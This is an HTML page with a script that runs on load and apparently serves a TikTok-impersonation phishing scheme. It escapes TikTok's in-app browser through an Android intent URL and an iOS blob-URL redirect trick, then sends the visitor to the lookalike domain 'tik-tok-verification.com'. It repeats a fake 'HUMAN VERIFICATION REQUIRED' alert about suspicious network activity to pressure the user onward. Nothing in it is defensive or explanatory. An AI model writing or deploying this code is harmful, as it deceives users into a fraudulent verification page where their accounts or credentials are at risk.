<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; }</style>
</head>
<body>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 15000;

    function forceSafariJump() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        if (isAndroid) {
            // Android: Pure Browser Intent (No package specified)
            window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;action=android.intent.action.VIEW;end`;
        } else {
            // iOS: THE BLOB TRICK
            // We create a tiny "fake" file that redirects to your URL.
            // TikTok can't run this, so it pushes the user to Safari.
            const blobContent = `<script>window.location.href="${targetUrl}";<\/script>`;
            const blob = new Blob([blobContent], {type: 'text/html'});
            const blobUrl = URL.createObjectURL(blob);
            
            // This specific call often forces the "Open in Safari?" prompt
            window.location.assign(blobUrl);
            
            // Backup: Direct location
            setTimeout(() => {
                window.location.href = targetUrl;
            }, 100);
        }
    }

    function securityLogic() {
        if (Date.now() > killTime) return;

        // 1. Try to force Safari
        forceSafariJump();

        // 2. Focus Check
        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                alert(header + body);

                // 3. Post-Alert Relay (User Gesture)
                forceSafariJump();

                setTimeout(securityLogic, 320);
            }
        }, 320);
    }

    window.onload = securityLogic;
    window.onfocus = () => { if (Date.now() < killTime) securityLogic(); };
</script>

</body>
</html>
